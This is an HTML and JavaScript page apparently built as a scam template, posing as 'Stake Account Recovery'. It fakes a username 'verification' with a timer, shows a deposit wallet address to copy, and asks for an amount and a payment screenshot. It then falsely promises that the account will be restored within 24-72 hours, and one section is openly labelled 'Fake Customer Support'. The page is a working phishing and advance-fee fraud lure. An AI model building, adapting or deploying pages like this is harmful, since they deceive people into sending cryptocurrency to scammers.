<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Stake Account Recovery</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #0e0e0e;
      color: #fff;
    }

    .container {
      max-width: 500px;
      margin: auto;
      padding: 20px;
    }

    h1 {
      text-align: center;
      color: #ffffff;
    }

    input, select, button {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      background-color: #1e1e1e;
      color: #fff;
      border: 1px solid #444;
      border-radius: 5px;
    }

    .copy-btn {
      margin-top: -10px;
      background-color: #333;
      cursor: pointer;
    }

    .verified-msg {
      color: #0f0;
      text-align: center;
      display: none;
    }

    .popup-wrapper {
      position: fixed;
      top: 0;
      left: 0;
      height: 100%;
      width: 100%;
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }

    .popup-blur {
      position: absolute;
      top: 0;
      left: 0;
      height: 100%;
      width: 100%;
      backdrop-filter: blur(5px);
      background: rgba(0, 0, 0, 0.5);
      z-index: 999;
    }

    .popup-message {
      background: #1e1e1e;
      border: 1px solid #444;
      padding: 20px;
      border-radius: 10px;
      z-index: 1000;
      text-align: center;
      max-width: 400px;
    }

    .popup-message button {
      margin-top: 10px;
      background-color: #4caf50;
      border: none;
      cursor: pointer;
      padding: 10px;
      width: 100%;
      color: white;
      border-radius: 5px;
    }

    .support-section {
      margin-top: 30px;
      padding: 20px;
      background-color: #1a1a1a;
      border-radius: 10px;
    }

    .support-section select,
    .support-section textarea {
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Stake Account Recovery</h1>
    <input type="text" id="username" placeholder="Enter your Stake username" />
    <button onclick="verifyUsername()">Verify Username</button>
    <div class="verified-msg" id="verifiedMsg">âœ… Username verified</div>

    <select id="coinSelect">
      <option value="">Select Coin</option>
      <option value="BTC">Bitcoin (BTC)</option>
      <option value="ETH">Ethereum (ETH)</option>
    </select>

    <select id="networkSelect">
      <option value="">Select Network</option>
      <option value="mainnet">Mainnet</option>
      <option value="testnet">Testnet</option>
    </select>

    <input type="text" id="walletAddress" placeholder="Wallet Address" readonly />
    <button class="copy-btn" onclick="copyAddress()">Copy Address</button>

    <input type="number" id="amount" placeholder="Amount" />
    <input type="file" id="screenshot" accept="image/*" />
    <button onclick="submitForm()">Submit</button>

    <div class="support-section">
      <h3>Fake Customer Support</h3>
      <select>
        <option>Account not found</option>
        <option>Deposit issue</option>
        <option>2FA problem</option>
        <option>Other</option>
      </select>
      <textarea rows="4" placeholder="Describe your issue..."></textarea>
    </div>
  </div>

  <!-- Popup -->
  <div class="popup-wrapper" id="popupWrapper">
    <div class="popup-blur"></div>
    <div class="popup-message">
      <p>Your account recovery request has been received. We forward your query to the Stake technical team. Your Stake account will be fully active within 24 - 72 hours.</p>
      <button onclick="refreshPage()">OK</button>
    </div>
  </div>

  <script>
    function verifyUsername() {
      const btn = event.target;
      const msg = document.getElementById("verifiedMsg");
      btn.textContent = "Verifying...";
      setTimeout(() => {
        msg.style.display = "block";
        btn.textContent = "Verify Username";
      }, 2000);
    }

    function copyAddress() {
      const addr = document.getElementById("walletAddress");
      addr.select();
      addr.setSelectionRange(0, 99999);
      document.execCommand("copy");
      alert("Address copied to clipboard!");
    }

    function submitForm() {
      // Validate input
      const username = document.getElementById("username").value;
      const coin = document.getElementById("coinSelect").value;
      const network = document.getElementById("networkSelect").value;
      const amount = document.getElementById("amount").value;
      const screenshot = document.getElementById("screenshot").files.length;

      if (!username || !coin || !network || !amount || !screenshot) {
        alert("Please fill all fields and upload screenshot.");
        return;
      }

      document.getElementById("popupWrapper").style.display = "flex";
    }

    function refreshPage() {
      location.reload();
    }

    // Auto-set wallet address (optional)
    document.getElementById("networkSelect").addEventListener("change", () => {
      const coin = document.getElementById("coinSelect").value;
      const network = document.getElementById("networkSelect").value;
      const address = document.getElementById("walletAddress");
      if (coin && network) {
        address.value = `${coin}-${network}-wallet-xyz123`;
      } else {
        address.value = "";
      }
    });
  </script>
</body>
</html>
